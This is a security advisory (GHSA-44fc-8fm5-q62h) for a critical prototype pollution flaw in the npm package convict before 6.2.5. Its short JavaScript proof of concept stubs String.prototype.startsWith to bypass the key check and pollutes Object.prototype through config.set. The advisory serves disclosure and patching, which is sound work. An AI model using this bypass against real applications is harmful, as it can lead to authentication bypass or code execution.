# [C] Convict has Prototype Pollution via startsWith() function

## Summary
Severity: Critical
Advisory: GHSA-44fc-8fm5-q62h
CVE: CVE-2026-33864
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-44fc-8fm5-q62h
Type: github-advisory

## Affected
- npm: `convict` — affected >=0 <6.2.5

## Details
### Summary
A prototype pollution vulnerability exists in the latest version of the convict npm package (6.2.4). Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input started with a forbidden key, it is still possible to pollute `Object.prototype` via a crafted input using `String.prototype`. 

### Details
The vulnerability resides in line 564 of https://github.com/mozilla/node-convict/blob/master/packages/convict/src/main.js where `startsWith()` function is used to check whether user provided input contain forbidden strings. 

### PoC
#### Steps to reproduce
1. Install latest version of convict using `npm install` or cloning from git
2. Run the following code snippet:

```javascript
String.prototype.startsWith = () => false; 
const convict = require('convict');
let obj = {};
const config = convict(obj);
console.log({}.polluted);
config.set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);    // prints yes -> the patch is bypassed and prototype pollution occurred
```

#### Expected behavior
Prototype pollution should be prevented and {} should not gain new properties.
This should be printed on the console:
```
undefined
undefined OR throw an Error
```

#### Actual behavior
`Object.prototype` is polluted 
This is printed on the console:
```
undefined 
yes
```

### Impact
This is a prototype pollution vulnerability, which can have severe security implications depending on how convict is used by downstream applications. Any application that processes attacker-controlled input using `convict.set`  may be affected.
It could potentially lead to the following problems:

1. Authentication bypass
2. Denial of service
3. Remote code execution (if polluted property is passed to sinks like eval or child_process)

## References
- https://github.com/mozilla/node-convict/security/advisories/GHSA-44fc-8fm5-q62h
- https://github.com/mozilla/node-convict
- https://github.com/mozilla/node-convict/blob/master/packages/convict/src/main.js
